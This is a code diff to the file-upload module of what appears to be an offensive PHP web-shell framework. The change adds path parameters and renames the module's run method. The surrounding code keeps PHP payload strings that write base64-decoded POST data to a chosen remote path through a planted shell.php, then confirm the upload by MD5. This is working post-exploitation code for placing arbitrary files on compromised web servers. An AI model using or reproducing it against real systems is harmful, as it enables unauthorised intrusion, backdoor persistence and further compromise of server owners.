@@ -10,6 +10,7 @@ from core.http.cmdrequest import CmdRequest, NoDataException
 from base64 import b64encode
 from random import choice
 from hashlib import md5
+from core.parameters import ParametersList, Parameter as P
 
 classname = 'Upload'
     
@@ -23,6 +24,11 @@ class Upload(Module):
         Vector('shell.php', 'file_put_contents', "file_put_contents('%s', base64_decode($_POST['%s']));"),
         Vector('shell.php', 'fwrite', '$h = fopen("%s", "w"); fwrite($h, base64_decode($_POST["%s"]));')
         ])
+    
+    params = ParametersList('Upload a file to the target filesystem', vectors,
+            P(arg='lpath', help='Local file path', required=True, pos=0),
+            P(arg='rpath', help='Remote path', required=True, pos=1)
+            )
     
     def __init__(self, modhandler, url, password):
         Module.__init__(self, modhandler, url, password)    
@@ -39,22 +45,22 @@ class Upload(Module):
 
         payload = vector.payloads[0] % (remote_path, self.rand_post_name)
         
-        self.modhandler.load(vector.interpreter).run(payload, post_data = {self.rand_post_name : file_encoded_content})
+        self.modhandler.load(vector.interpreter).run_module(payload, post_data = {self.rand_post_name : file_encoded_content})
         
             
-        file_remote_md5 = self.modhandler.load('file.check').run(remote_path, 'md5')
+        file_remote_md5 = self.modhandler.load('file.check').run_module(remote_path, 'md5')
         if file_remote_md5 == file_local_md5:
             self.mprint('[%s] File \'%s\' uploaded.' % (self.name, remote_path))
             return True
         else:
-            file_exists = self.modhandler.load('file.check').run(remote_path, 'exists')
+            file_exists = self.modhandler.load('file.check').run_module(remote_path, 'exists')
             if file_exists:
                 self.mprint('[!] [%s] MD5 hash of \'%s\' file mismatch, file corrupted.' % (self.name, remote_path))
             else:
                 self.mprint ('[!] [%s] File \'%s\' creation failed, check remote path and permissions.' % ( self.name, remote_path))
     
 
-    def run( self, local_path, remote_path, file_content = None):
+    def run_module( self, local_path, remote_path, file_content = None):
         
                 
         if not file_content:
@@ -70,7 +76,7 @@ class Upload(Module):
         file_local_md5 = md5(file_content).hexdigest()
         file_encoded_content = b64encode(file_content)
 
-        if self.modhandler.load('file.check').run(remote_path, 'exists'):
+        if self.modhandler.load('file.check').run_module(remote_path, 'exists'):
             raise ModuleException(self.name,  "Remote file %s exists" % (remote_path))
             
                 
@@ -81,7 +87,6 @@ class Upload(Module):
         for vector in vectors:
             response = self.__execute_payload(vector, [file_encoded_content,  file_local_md5, remote_path])
             if response:
-                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                 return
 
         
